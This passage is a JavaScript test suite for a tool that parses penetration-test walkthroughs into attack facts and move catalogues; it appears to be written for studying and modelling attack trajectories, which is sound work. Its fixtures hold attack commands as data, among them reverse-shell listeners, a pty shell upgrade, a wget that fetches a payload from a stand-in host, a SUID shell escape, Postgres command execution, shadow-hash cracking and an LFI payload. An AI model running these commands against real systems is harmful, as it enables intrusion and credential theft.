      target: '198.51.100.36',
      forceTarget: '198.51.100.36'
    });
    const facts = sess.factSetForTarget('198.51.100.36');
    assert.ok(facts.has('port:20001'), 'Expected port:20001 to be present');
    assert.ok(facts.has('ftp.anonymous_login'), 'Expected ftp.anonymous_login to be present');
    assert.ok(!facts.has('port:21'), 'Must not entail phantom port:21 when FTP runs on 20001/tcp');
  });

  test('PG1-15: FTP 530 Login or password incorrect! (with versioned 220 banner) and 534 Policy requires SSL classify as rejected', () => {
    const sess1 = newSession('198.51.100.37');
    const ftp530 = [
      'Connected to 198.51.100.37.',
      '220-FileZilla Server 0.9.60 beta',
      '220-written by Tim Kosse (tim.kosse@filezilla-project.org)',
      '220 Please visit https://filezilla-project.org/',
      'Name (198.51.100.37:operator): anonymous',
      '331 Password required for anonymous',
      'Password:',
      '530 Login or password incorrect!',
      'Login failed.'
    ].join('\n');
    const r530 = sess1.ingestTurn({
      command: 'ftp 198.51.100.37',
      stdout: ftp530,
      target: '198.51.100.37',
      forceTarget: '198.51.100.37'
    });
    assert.strictEqual(
      r530.outcome && r530.outcome.kind,
      'rejected',
      'Expected FTP 530 Login or password incorrect! with versioned banner to classify as rejected, got ' + (r530.outcome && r530.outcome.kind)
    );

    const sess2 = newSession('198.51.100.38');
    const ftp534 = [
      'Connected to 198.51.100.38.',
      '220 Microsoft FTP Service',
      '534 Local policy on server does not allow TLS secure connections.',
      'Name (198.51.100.38:operator): anonymous',
      '534 Policy requires SSL.',
      'Login failed.',
      'No control connection for command: Permission denied'
    ].join('\n');
    const r534 = sess2.ingestTurn({
      command: 'ftp-ssl 198.51.100.38',
      stdout: ftp534,
      target: '198.51.100.38',
      forceTarget: '198.51.100.38'
    });
    assert.strictEqual(
      r534.outcome && r534.outcome.kind,
      'rejected',
      'Expected FTP 534 Policy requires SSL. + Login failed. to classify as rejected, got ' + (r534.outcome && r534.outcome.kind)
    );
  });

  test('PG1-16: Windows installed-software baseline subtraction filters Visual C++ and VC++ runtimes', () => {
    const sess = newSession('198.51.100.39');
    const swTable = [
      'DisplayName                                                   DisplayVersion',
      '-----------                                                   --------------',
      'Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29914   14.28.29914',
      'Microsoft Visual C++ 2015-2022 Redistributable (x64)          14.36.32532.0',
      'Microsoft VC++ Redistributable                                12.0.30501',
      'VMware Tools                                                  11.3.5.18557794',
      'Acme Backup Agent                                             3.4.2'
    ].join('\n');
    const rep = sess.ingestTurn({
      command: 'Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion',
      stdout: swTable,
      target: '198.51.100.39',
      forceTarget: '198.51.100.39'
    });
    const minted = rep.minted_facts || [];
    const notable = findFacts(minted, 'host.notable_program');
    const banners = findFacts(minted, 'exploit.versioned_banner');
    assert.strictEqual(notable.length, 1, 'Expected only 1 non-baseline host.notable_program, got ' + notable.length);
    assert.strictEqual(notable[0].value.name, 'Acme Backup Agent');
    assert.strictEqual(notable[0].value.version, '3.4.2');
    assert.strictEqual(banners.length, 1, 'Expected only 1 non-baseline exploit.versioned_banner, got ' + banners.length);
    assert.strictEqual(banners[0].value.product, 'Acme Backup Agent');
    assert.strictEqual(banners[0].value.version, '3.4.2');
  });

  test('PG1-17: Narrow ProgramName/DisplayVersion tabular headers do not truncate overflowing multi-word software names', () => {
    const sess1 = newSession('198.51.100.40');
    const narrowDashless = [
      'ProgramName   DisplayVersion',
      'Enterprise FileSync Server Suite   10.0.28'
    ].join('\n');
    const r1 = sess1.ingestTurn({
      command: 'Get-InstalledSoftware',
      stdout: narrowDashless,
      target: '198.51.100.40',
      forceTarget: '198.51.100.40'
    });
    const n1 = findFacts(r1.minted_facts || [], 'host.notable_program');
    const b1 = findFacts(r1.minted_facts || [], 'exploit.versioned_banner');
    assert.strictEqual(n1.length, 1, 'Expected 1 host.notable_program for dashless narrow header');
    assert.strictEqual(n1[0].value.name, 'Enterprise FileSync Server Suite');
    assert.strictEqual(n1[0].value.version, '10.0.28');
    assert.strictEqual(b1.length, 1, 'Expected 1 exploit.versioned_banner for dashless narrow header');
    assert.strictEqual(b1[0].value.product, 'Enterprise FileSync Server Suite');
    assert.strictEqual(b1[0].value.search_query, 'Enterprise FileSync Server Suite 10.0');

    const sess2 = newSession('198.51.100.41');
    const narrowDashed = [
      'DisplayName   DisplayVersion',
      '-----------   --------------',
      'Acme Archive1 Agent   4.2.1'
    ].join('\n');
    const r2 = sess2.ingestTurn({
      command: 'Get-InstalledSoftware',
      stdout: narrowDashed,
      target: '198.51.100.41',
      forceTarget: '198.51.100.41'
    });
    const n2 = findFacts(r2.minted_facts || [], 'host.notable_program');
    const b2 = findFacts(r2.minted_facts || [], 'exploit.versioned_banner');
    assert.strictEqual(n2.length, 1, 'Expected 1 host.notable_program for dashed narrow header');
    assert.strictEqual(n2[0].value.name, 'Acme Archive1 Agent');
    assert.strictEqual(n2[0].value.version, '4.2.1');
    assert.strictEqual(b2.length, 1, 'Expected 1 exploit.versioned_banner for dashed narrow header');
    assert.strictEqual(b2[0].value.product, 'Acme Archive1 Agent');
    assert.strictEqual(b2[0].value.search_query, 'Acme Archive1 Agent 4.2');
  });

  // ---- Part III: Cohort PG-2 Slice B4 Corpus Harness & Trajectory Generalizations ----

  test('PG2-B4-1: probeBlockStateless forwards followPrompt to parsers and outcomes without forcing stateless context.target', () => {
    let seenParseArg = null;
    let seenOutcomeArg = null;
    const mockObol = {
      parsers: {
        parseActionOutput: function (arg) {
          seenParseArg = arg;
          return { facts: [], diagnostics: [] };
        }
      },
      outcomes: {
        classify: function (arg) {
          seenOutcomeArg = arg;
          return { kind: 'success' };
        }
      }
    };
    probeBlockStateless(mockObol, {
      command: 'su',
      stdout: 'Password:',
      promptLine: 'op_user@app-node-01:~$ su',
      followPrompt: 'root@app-node-01:~#',
      target: '198.51.100.51'
    });
    assert.ok(seenParseArg && seenParseArg.context, 'Expected parseContext object');
    assert.strictEqual(seenParseArg.context.promptLine, 'op_user@app-node-01:~$ su');
    assert.strictEqual(seenParseArg.context.followPrompt, 'root@app-node-01:~#');
    assert.strictEqual(seenParseArg.context.target, undefined, 'Stateless probe must not set parseContext.target unless caller supplied opts.context.target');
    assert.ok(seenOutcomeArg && seenOutcomeArg.context, 'Expected outcomes.classify context object');
    assert.strictEqual(seenOutcomeArg.followPrompt, 'root@app-node-01:~#');
    assert.strictEqual(seenOutcomeArg.context.followPrompt, 'root@app-node-01:~#');

    const liveProbe = probeBlockStateless(OBOL, {
      command: 'su',
      stdout: 'Password:',
      promptLine: 'op_user@app-node-01:~$ su',
      followPrompt: 'root@app-node-01:~#',
      target: '198.51.100.51'
    });
    assert.ok(liveProbe.supported_kinds.includes('foothold.linux'), 'Expected foothold.linux from root followPrompt');
    assert.ok(liveProbe.supported_kinds.includes('access.root'), 'Expected access.root from root followPrompt');
  });

  test('PG2-B4-2: facts-axis sequential idsByCmdAndOut queue preserves distinct followPrompt on duplicate command+output keys', () => {
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'obol-pg2-b4-'));
    try {
      const wtDir = path.join(tmpDir, 'walkthroughs');
      fs.mkdirSync(wtDir, { recursive: true });
      const md = [
        '# Synthetic Duplicate Key Check',
        '',
        '```console',
        'postgres=# \\q',
        '```',
        '',
        '```console',
        'op_user@app-node-01:~$ psql \\q',
        'root@app-node-01:~#',
        '```'
      ].join('\n');
      fs.writeFileSync(path.join(wtDir, 'synth_dup.md'), md, 'utf8');

      const turns = extractor.extractWalkthroughTurns(md).turns;
      assert.strictEqual(turns.length, 2, 'Expected 2 extracted turns');
      assert.strictEqual(turns[0].command, 'psql \\q');
      assert.strictEqual(turns[1].command, 'psql \\q');
      assert.strictEqual(turns[0].output, '');
      assert.strictEqual(turns[1].output, '');
      assert.strictEqual(turns[0].followPrompt || '', '');
      assert.strictEqual(turns[1].followPrompt || '', 'root@app-node-01:~#');

      const id1 = extractor.blockId('synth_dup.md', turns[0].rawCommand, turns[0].output);
      const id2 = extractor.blockId('synth_dup.md', turns[1].rawCommand, turns[1].output);
      assert.notStrictEqual(id1, id2, 'Expected distinct blockIds from distinct rawCommand values');

      const labelsFile = path.join(tmpDir, 'labels.json');
      fs.writeFileSync(labelsFile, JSON.stringify({
        version: 2,
        description: 'Synthetic duplicate command+output queue test',
        cases: [
          {
            id: id1,
            file: 'synth_dup.md',
            command: 'psql \\q',
            expected_kinds: [],
            forbidden_kinds: ['access.root']
          },
          {
            id: id2,
            file: 'synth_dup.md',
            command: 'psql \\q',
            expected_kinds: ['foothold.linux', 'access.root'],
            forbidden_kinds: []
          }
        ]
      }, null, 2), 'utf8');

      const res = factsAxis.runFactsAxis({
        OBOL: OBOL,
        corpusDir: tmpDir,
        labels: labelsFile,
        writeReports: false
      });
      assert.deepStrictEqual(res.report.missing_blocks, []);
      assert.strictEqual(res.report.totals.miss, 0, 'Expected 0 missed facts');
      assert.strictEqual(res.report.totals.forbidden_hits, 0, 'Expected 0 forbidden hits on first duplicate turn');
    } finally {
      fs.rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  test('PG2-B4-3: Linux capability lines are rejected by isCommandLikeLine and preserved intact in unprompted fences', () => {
    assert.strictEqual(extractor.isCommandLikeLine('/usr/bin/python3.9 = cap_setuid+ep'), false);
    assert.strictEqual(extractor.isCommandLikeLine('/usr/bin/tar cap_dac_read_search=ep'), false);
    assert.strictEqual(extractor.isCommandLikeLine('getcap -r / 2>/dev/null'), true);

    const md = [
      '```bash',
      'getcap -r / 2>/dev/null',
      '```',
      '',
      '```',
      '/usr/bin/python3.9 = cap_setuid+ep',
      '/usr/bin/ping = cap_net_raw+ep',
      '```'
    ].join('\n');
    const turns = extractor.extractWalkthroughTurns(md).turns;
    assert.strictEqual(turns.length, 2, 'Uncaptioned adjacent command and capability fences must remain separate turns');
    assert.strictEqual(turns[0].rawCommand, 'getcap -r / 2>/dev/null');
    assert.strictEqual(turns[0].output, '');
    assert.strictEqual(turns[1].rawCommand, '');
    assert.ok(turns[1].output.indexOf('/usr/bin/python3.9 = cap_setuid+ep') >= 0, 'Line 1 of capability output must not be consumed as rawCommand');
  });

  test('PG2-B4-4: perl and ruby CLI invocations are recognized as commands while English prose stays excluded', () => {
    assert.strictEqual(extractor.isCommandLikeLine('perl exploit.pl 198.51.100.10 8080'), true);
    assert.strictEqual(extractor.isCommandLikeLine('ruby -e \'puts "ok"\''), true);
    assert.strictEqual(extractor.isCommandLikeLine('ruby poc_runner.rb --target 198.51.100.10'), true);
    assert.strictEqual(extractor.isCommandLikeLine('Ruby is a dynamic language used by web frameworks'), false);
    assert.strictEqual(extractor.isCommandLikeLine('Perl scripts are often installed under /usr/local/bin'), false);
  });

  test('PG2-B4-5: followPrompt capture on su/sudo/nc -nlvp443, intermediate landing prompts, and pty.spawn propagation', () => {
    const mdSu = [
      '```console',
      'op_user@app-node-01:~$ su',
      'Password:',
      'root@app-node-01:/home/op_user#',
      'root@app-node-01:/home/op_user# id',
      'uid=0(root) gid=0(root) groups=0(root)',
      '```'
    ].join('\n');
    const suTurns = extractor.extractWalkthroughTurns(mdSu).turns;
    assert.strictEqual(suTurns.length, 2, 'Intermediate empty landing prompt must not emit a ghost command-less turn');
    assert.strictEqual(suTurns[0].command, 'su');
    assert.strictEqual(suTurns[0].output, 'Password:');
    assert.strictEqual(suTurns[0].followPrompt, 'root@app-node-01:/home/op_user#');
    assert.strictEqual(suTurns[1].command, 'id');

    const mdNcPty = [
      '```console',
      'kali@kali:~$ nc -nlvp443',
      'listening on [any] 443 ...',
      'connect to [10.10.14.5] from (UNKNOWN) [198.51.100.52] 49210',
      'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
      'www-data@app-node-01:/var/www/html$',
      '```'
    ].join('\n');
    const ncTurns = extractor.extractWalkthroughTurns(mdNcPty).turns;
    assert.ok(ncTurns.length >= 1);
    assert.strictEqual(ncTurns[0].command, 'nc -nlvp443');
    assert.strictEqual(ncTurns[0].followPrompt, 'www-data@app-node-01:/var/www/html$');
  });

  test('PG2-B4-6: Pre-prompt unprompted artifact dump before first prompt splits cleanly without altering prompted turn', () => {
    const synthHash = '$6$synthSalt01$0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef012345';
    const md = [
      '```console',
      '\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Readable shadow backup',
      'svc_backup:' + synthHash + ':19000:0:99999:7:::',
      'kali@kali:~$ hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt',
      synthHash + ':Winter2026!',
      '```'
    ].join('\n');
    const turns = extractor.extractWalkthroughTurns(md).turns;
    assert.strictEqual(turns.length, 2, 'Expected leading unprompted artifact unit + prompted hashcat unit');
    assert.strictEqual(turns[0].rawCommand, '');
    assert.ok(turns[0].output.indexOf('svc_backup:' + synthHash) >= 0);
    assert.strictEqual(turns[1].rawCommand, 'hashcat -m 1800 shadow.hash /usr/share/wordlists/rockyou.txt');
    assert.strictEqual(turns[1].output, synthHash + ':Winter2026!');
  });

  test('PG2-B4-7: isBareHashCommand rejects prose comments with tool heads and workflow-arrow summaries', () => {
    assert.strictEqual(extractor.isBareHashCommand('# zip files are not viewable via http://198.51.100.10/archive.zip'), false);
    assert.strictEqual(extractor.isBareHashCommand('# curl > wget > chmod > execute payload'), false);
    assert.strictEqual(extractor.isBareHashCommand('# python script is located in the root folder'), false);
    assert.strictEqual(extractor.isBareHashCommand('# zip -r /tmp/site.zip /var/www/html'), true);
    assert.strictEqual(extractor.isBareHashCommand('# find / -name proof.txt 2>/dev/null'), true);
  });

  test('PG2-B4-8: pspy32, pspy64, and pspy64s are recognized as CLI tools and classified as pspy', () => {
    assert.strictEqual(extractor.isCommandLikeLine('./pspy64 -pf -i 1000'), true);
    assert.strictEqual(extractor.isCommandLikeLine('pspy64s'), true);
    assert.strictEqual(extractor.isCommandLikeLine('pspy32'), true);
    assert.strictEqual(extractor.detectTool('./pspy64 -pf -i 1000', ''), 'pspy');
    assert.strictEqual(extractor.detectTool('pspy64s', ''), 'pspy');
    assert.strictEqual(extractor.detectTool('pspy32', ''), 'pspy');
  });

  test('PG2-B4-9: Bare artifact fence classification and URL-attributed HTTP API json credential fence extraction', () => {
    assert.strictEqual(extractor.classifyFenceBlock('', '\u2550\u2550\u2550\u2550\u2550\u2550\u2563 System Information\nOS: Linux 5.15.0').include, true);
    assert.strictEqual(extractor.classifyFenceBlock('', 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin').include, true);
    assert.strictEqual(extractor.classifyFenceBlock('', 'Username   Password\nop_admin   SynthPass99!').include, true);
    assert.strictEqual(extractor.classifyFenceBlock('', '# /etc/exports: the access control list\n/srv/share *(rw,no_root_squash)').include, true);
    assert.strictEqual(extractor.classifyFenceBlock('', '-------------SuidEnum-------------\n/usr/bin/find').include, true);
    assert.strictEqual(extractor.classifyFenceBlock('', 'Usage: backupctl [OPTION]...\nReport bugs to <maintainers@example.org>.').include, true);

    const mdApi = [
      'Querying `http://198.51.100.53:8080/api/v1/users` returns the account JSON:',
      '',
      '```json',
      '{',
      '  "username": "op_user",',
      '  "password": "SynthApiValue42!"',
      '}',
      '```',
      '',
      'Unrelated static package manifest:',
      '',
      '```json',
      '{',
      '  "name": "widget-ui",',
      '  "private": true',
      '}',
      '```'
    ].join('\n');
    const turns = extractor.extractWalkthroughTurns(mdApi).turns;
    assert.strictEqual(turns.length, 1, 'Only URL-attributed credential API JSON fence should be extracted');
    assert.strictEqual(turns[0].rawCommand, '');
    assert.strictEqual(turns[0].command, 'curl');
    assert.ok(turns[0].output.indexOf('"SynthApiValue42!"') >= 0);
  });

  test('PG2-B4-10: Session-aware isAttackerTurn handles sh-X.Y prompts and bare prompts with target shell state', () => {
    const footholdSet = new Set(['foothold.linux']);
    assert.strictEqual(
      trajectories.isAttackerTurn({ kind: 'unix', promptLine: 'sh-5.1$ id', command: 'id' }, {}),
      false
    );
    assert.strictEqual(
      trajectories.isAttackerTurn({ kind: 'bare', isHash: true, promptLine: '# cat proof.txt', command: 'cat proof.txt' }, { facts: footholdSet }),
      false
    );
    assert.strictEqual(
      trajectories.isAttackerTurn({ kind: 'bare', isDollar: true, promptLine: '$ cat local.txt', command: 'cat local.txt' }, { inTargetShell: true }),
      false
    );
    assert.strictEqual(
      trajectories.isAttackerTurn({ kind: 'bare', isDollar: true, promptLine: '$ hashcat -m 0 hash.txt rockyou.txt', command: 'hashcat -m 0 hash.txt rockyou.txt' }, { inTargetShell: true, facts: footholdSet }),
      true,
      'Attacker-only cracking/scanning tools on bare $ prompt must remain attacker turns'
    );
  });

  test('PG2-B4-11: isHousekeepingTurn handles attached-port listeners, target git clone, and foothold flag reads', () => {
    assert.strictEqual(
      trajectories.isHousekeepingTurn({ command: 'nc -nlvp443', stdout: '' }).reason,
      'local_listener_wait'
    );
    assert.strictEqual(
      trajectories.isHousekeepingTurn({ command: 'socat TCP-LISTEN:4444,reuseaddr,fork -', stdout: '' }).reason,
      'local_listener_wait'
    );
    assert.strictEqual(
      trajectories.isHousekeepingTurn({ host: 'kali', command: 'git clone https://github.com/org/helper-tool.git', stdout: '' }).housekeeping,
      true
    );
    assert.strictEqual(
      trajectories.isHousekeepingTurn({ host: 'kali', command: 'git clone http://198.51.100.54/webapp.git', stdout: '' }).housekeeping,
      false,
      'Target-hosted git clone must not be discarded as attacker_workspace_prep'
    );
    assert.strictEqual(
      trajectories.isHousekeepingTurn(
        { kind: 'bare', isHash: true, promptLine: '# cat proof.txt', command: 'cat proof.txt', stdout: '0123456789abcdef0123456789abcdef' },
        { facts: new Set(['foothold.linux', 'access.root']) }
      ).housekeeping,
      false,
      'Explicit flag read with foothold must not be discarded as attacker_local_file_op'
    );
  });

  test('PG2-B4-12: matchTurnToCatalogMoves disambiguates find -exec shell, find flag search, ssh, and psql', () => {
    const linuxFacts = new Set(['foothold.linux', 'privesc.suid']);
    const findExecMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-01', kind: 'unix', command: 'find . -exec /bin/sh -p \\; -quit' },
      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.55' }
    ).map(c => c.id);
    assert.strictEqual(findExecMoves[0], 'suid-gtfobins');
    assert.ok(!findExecMoves.includes('flag-hunt-linux') && !findExecMoves.includes('flag-hunt-root-linux'));

    const findFlagMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'app-node-01', kind: 'unix', command: 'find / -name local.txt 2>/dev/null' },
      { facts: linuxFacts, inTargetShell: true, target: '198.51.100.55' }
    ).map(c => c.id);
    assert.strictEqual(findFlagMoves[0], 'flag-hunt-linux');
    assert.ok(!findFlagMoves.includes('suid-gtfobins'));

    const sshKeyMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'ssh -i id_rsa op_user@198.51.100.55' },
      { facts: new Set(['port:22', 'service.ssh', 'loot.ssh_key']), target: '198.51.100.55' }
    ).map(c => c.id);
    assert.strictEqual(sshKeyMoves[0], 'ssh-key-login');
    assert.ok(!sshKeyMoves.includes('pivot-ssh-dynamic') && !sshKeyMoves.includes('pivot-ssh-portforward'));

    const sshPassMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'ssh op_user@198.51.100.55' },
      { facts: new Set(['port:22', 'service.ssh', 'credential.valid']), target: '198.51.100.55' }
    ).map(c => c.id);
    assert.ok(
      sshPassMoves[0] === 'ssh-login' || sshPassMoves[0] === 'linux-remote-exec',
      'Expected ssh-login or linux-remote-exec at #1 for ssh user@target, got ' + sshPassMoves[0]
    );
    assert.ok(!sshPassMoves.includes('pivot-ssh-dynamic'));

    const psqlRceMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'psql -h 198.51.100.55 -U postgres -c "COPY cmd_exec FROM PROGRAM \'id\';"' },
      { facts: new Set(['port:5432', 'service.postgres']), target: '198.51.100.55' }
    ).map(c => c.id);
    assert.strictEqual(psqlRceMoves[0], 'postgres-rce');
    assert.ok(!psqlRceMoves.includes('postgres-login'));

    const psqlLoginMoves = trajectories.matchTurnToCatalogMoves(
      OBOL,
      { host: 'kali', kind: 'unix', command: 'psql -h 198.51.100.55 -U postgres -d appdb' },
      { facts: new Set(['port:5432', 'service.postgres']), target: '198.51.100.55' }
    ).map(c => c.id);
    assert.strictEqual(psqlLoginMoves[0], 'postgres-login');
  });

  test('PG2-B4-13: replayWalkthrough seeds pre-command root prompt telemetry and guards DOSBox prompts on Linux targets', () => {
    const md = [
      '```console',
      'op_user@app-node-01:~$ id',
      'uid=1000(op_user) gid=1000(op_user) groups=1000(op_user)',
      '```',
      '',
      '```console',
      'C:\\> MOUNT C /',
      'Drive C is mounted as local directory /',
      '```',
      '',
      '```console',
      'root@app-node-01:~# cat /root/proof.txt',
      'fedcba9876543210fedcba9876543210',
      '```'
    ].join('\n');

    const rep = trajectories.replayWalkthrough(OBOL, {
      slug: 'synth-preprompt-dosbox',
      markdown: md,
      trajectory_checkpoints: [{
        step_index: 3,
        target_ip: '198.51.100.56',
        required_gates: ['foothold.linux', 'access.root']
      }]
    }, {
      target: '198.51.100.56',
      lhost: '10.10.14.5'
    });

    const rootFlagStep = rep.steps.find(s => /proof\.txt/.test(s.command));
    assert.ok(rootFlagStep, 'Expected root flag step in replay report');
    assert.ok(
      rootFlagStep.reachability && rootFlagStep.reachability.reachable,
      'Expected root@app-node-01:~# cat /root/proof.txt to be reachable via pre-command prompt seeding'
    );
    assert.ok(rep.checkpoints.length === 1 && rep.checkpoints[0].ok, 'Expected final checkpoint to hold foothold.linux and access.root');

    const allMinted = [];
    for (const s of rep.steps) {
      for (const k of (s.minted_kinds || [])) allMinted.push(k);
    }
    assert.ok(!allMinted.includes('foothold.windows'), 'DOSBox MOUNT C / prompt on Linux foothold must not mint foothold.windows');
  });

  // =========================================================================
  // PG-3 Wave-B Slice B4: Extractor, Harvester, and Trajectory Replay Checks
  // =========================================================================

  test('PG3-B4-1: Space-separated working-directory Unix prompts split cleanly without merging into prior turns', () => {
    const seg = extractor.segmentBlock([
      '$ gobuster dir -u http://198.51.100.70:8080 -w /usr/share/wordlists/common.txt',
      '/admin                (Status: 301) [Size: 0]',
      '/config               (Status: 301) [Size: 0]',
      'www-data@198.51.100.70 ~$ id',
      'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
      'www-data@app-node-03 /var/www/app$ which nc',
      '/bin/nc'
    ].join('\n'));
    assert.strictEqual(seg.units.length, 3, 'Expected 3 distinct turns after space-cwd prompt splitting');
    assert.ok(/^gobuster\b/.test(seg.units[0].command));
    assert.ok(!/uid=33/.test(seg.units[0].output), 'Target shell id output must not leak into gobuster stdout');
    assert.strictEqual(seg.units[1].command, 'id');
    assert.strictEqual(seg.units[1].user, 'www-data');
    assert.strictEqual(seg.units[2].command, 'which nc');
    assert.strictEqual(seg.units[2].host, 'app-node-03');
  });

  test('PG3-B4-2: Iterative double-prompt peeling strips duplicated PTY prompt prefixes', () => {
    const mp = extractor.matchPromptLine('svc_worker@app-node-03:~$ svc_worker@app-node-03:~$ whoami');
    assert.ok(mp, 'Expected double-echoed Unix prompt to match');
    assert.strictEqual(mp.command, 'whoami');
    assert.strictEqual(mp.rawCommand, 'whoami');
    assert.strictEqual(mp.user, 'svc_worker');
    assert.strictEqual(mp.host, 'app-node-03');

    const seg = extractor.segmentBlock([
      '$ python3 -c \'import pty; pty.spawn("/bin/bash")\'',
      'svc_worker@app-node-03:~$ svc_worker@app-node-03:~$ id',
      'uid=1001(svc_worker) gid=1001(svc_worker) groups=1001(svc_worker)'
    ].join('\n'));
    assert.strictEqual(seg.units.length, 2);
    assert.strictEqual(seg.units[0].followPrompt, 'svc_worker@app-node-03:~$');
    assert.strictEqual(seg.units[1].command, 'id');
  });

  test('PG3-B4-3: Pseudo-shell and relative-cwd target Unix prompts split cleanly with remote-linux hostHint', () => {
    const seg = extractor.segmentBlock([
      'webapp-shell# cat /var/www/app/settings.php',
      '$db_pass = "SynthDbSecret88";',
      'op_admin/work$ /usr/bin/wget http://198.51.100.2/helper -O /tmp/helper',
      'Saving to: \'/tmp/helper\'',
      'op_admin@app-node-03:/home/op_admin/work$ su svc_elev',
      'Password:'
    ].join('\n'));
    assert.strictEqual(seg.units.length, 3);
    assert.strictEqual(seg.units[0].command, 'cat /var/www/app/settings.php');
    assert.strictEqual(seg.units[0].hostHint, 'remote-linux');
    assert.strictEqual(trajectories.isAttackerTurn(seg.units[0], {}), false);
    assert.strictEqual(seg.units[1].command, '/usr/bin/wget http://198.51.100.2/helper -O /tmp/helper');
    assert.strictEqual(seg.units[1].user, 'op_admin');
    assert.strictEqual(seg.units[1].hostHint, 'remote-linux');
    assert.strictEqual(trajectories.isAttackerTurn(seg.units[1], {}), false);
    assert.strictEqual(seg.units[2].command, 'su svc_elev');
  });

  test('PG3-B4-4: Bare-hash prose guards, active REPL bare-hash suppression, and explicit pty.spawn followPrompt propagation', () => {
    assert.strictEqual(extractor.isBareHashCommand('# /bin/sh shell'), false);
    assert.strictEqual(extractor.isBareHashCommand('# /bin/bash shel'), false);
    assert.strictEqual(extractor.isBareHashCommand('# hostname looks odd; maybe container?'), false);
    assert.strictEqual(extractor.isBareHashCommand('# use op_user id_rsa to transfer custom id_rsa.pub to /home/op_user/.ssh/'), false);
    assert.strictEqual(extractor.isBareHashCommand('# source shows'), false);

    assert.strictEqual(extractor.isBareHashCommand('# /bin/bash -p'), true);
    assert.strictEqual(extractor.isBareHashCommand('# use exploit/multi/handler'), true);
    assert.strictEqual(extractor.isBareHashCommand('# source ~/.bashrc'), true);

    const replSeg = extractor.segmentBlock([
      'postgres=# SELECT * FROM cmd_out;',
      ' uid=999(postgres) gid=999(postgres)',
      '# /bin/sh shell',
      '# id'
    ].join('\n'));
    assert.strictEqual(replSeg.units.length, 1, 'Active DB REPL must suppress bare-hash author notes');
    assert.ok(replSeg.units[0].output.indexOf('# /bin/sh shell') >= 0);

    const ptySeg = extractor.segmentBlock([
      'op_user@app-node-03:/tmp$ python3 local_helper_exploit.py',
      '[+] Triggering payload',
      '# python3 -c \'import pty; pty.spawn("/bin/bash")\'',
      'root@app-node-03:/root# id',
      'uid=0(root) gid=0(root) groups=0(root)'
    ].join('\n'));
    assert.strictEqual(ptySeg.units.length, 3);
    assert.strictEqual(ptySeg.units[0].command, 'python3 local_helper_exploit.py');
    assert.strictEqual(ptySeg.units[0].followPrompt, 'root@app-node-03:/root#');
    assert.strictEqual(ptySeg.units[1].followPrompt, 'root@app-node-03:/root#');
    assert.strictEqual(ptySeg.units[2].command, 'id');
  });

  test('PG3-B4-5: Bare fence classifier recovers standalone Nmap Host script results, pspy CMD lines, and single-bar LinPEAS headers', () => {
    const nseText = [
      'Host script results:',
      '| smb-enum-shares:',
      '|   account_used: guest',
      '|   \\\\198.51.100.71\\IPC$:',
      '|_    Anonymous access: READ'
    ].join('\n');
    assert.strictEqual(extractor.classifyFenceBlock('', nseText).include, true);
    const nseSeg = extractor.segmentBlock(nseText);
    assert.strictEqual(nseSeg.units.length, 1);
    assert.strictEqual(nseSeg.units[0].command, 'nmap');
    assert.strictEqual(nseSeg.units[0].rawCommand, '');

    const pspyText = '2026/05/12 09:14:02 CMD: UID=0    PID=4120   | /bin/sh -c /usr/local/bin/rotate_logs.sh';
    assert.strictEqual(extractor.classifyFenceBlock('', pspyText).include, true);

    const peasSubHeader = '\u2550\u2563 Writable passwd file? .............. /etc/passwd is writable';
    assert.strictEqual(extractor.classifyFenceBlock('', peasSubHeader).include, true);
  });

  test('PG3-B4-6: Bare fence classifier recovers URL-encoded credential callbacks and target HTTP/LFI source captures while rejecting static code', () => {
    const callbackBody = 'first_name%3DOps%26username%3Dsvc_mail%26password%3DSynthMailPass77%21';
    assert.strictEqual(extractor.classifyFenceBlock('', callbackBody).include, true);

    const httpCapture = [
      'http://198.51.100.72:8080/cfg/cache.conf',
      '# requirepass SynthCacheSecret55'
    ].join('\n');
    const httpCls = extractor.classifyFenceBlock('', httpCapture);
    assert.strictEqual(httpCls.include, true);
    assert.strictEqual(httpCls.reason, 'bare-http-capture');
    const httpSeg = extractor.segmentBlock({ text: httpCapture, classificationReason: httpCls.reason });
    assert.strictEqual(httpSeg.units.length, 1);
    assert.strictEqual(httpSeg.units[0].command, 'curl');
    assert.ok(httpSeg.units[0].output.indexOf('SynthCacheSecret55') >= 0);

    const lfiSource = [
      'PD9waHAgJGRiX3VzZXIgPSAnYXBwX3N2Yyc7ICRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsgPz4=',
      '# decode',
      '<?php',
      '$db_user = "app_svc";',
      '?>'
    ].join('\n');
    const lfiCls = extractor.classifyFenceBlock('', lfiSource, {
      prevProseLines: ['Synthetic test url `http://198.51.100.72/portal.php?tpl=php://filter/convert.base64-encode/resource=synth_cfg`']
    });
    assert.strictEqual(lfiCls.include, true);
    assert.strictEqual(lfiCls.reason, 'bare-lfi-source');

    assert.strictEqual(extractor.classifyFenceBlock('', '<?php\nfunction localHelper($x) { return $x + 1; }\n?>').include, false);
    assert.strictEqual(extractor.classifyFenceBlock('', 'https://github.com/example/project?tab=readme\nProject notes').include, false);
  });

  test('PG3-B4-7: smtp-user-enum is registered in isCommandLikeLine, detectTool, and FACT_BEARING', () => {
    assert.strictEqual(extractor.isCommandLikeLine('smtp-user-enum -M VRFY -U /tmp/users.txt -t 198.51.100.73'), true);
    assert.strictEqual(extractor.detectTool('smtp-user-enum -M VRFY -U /tmp/users.txt -t 198.51.100.73'), 'smtp-user-enum');
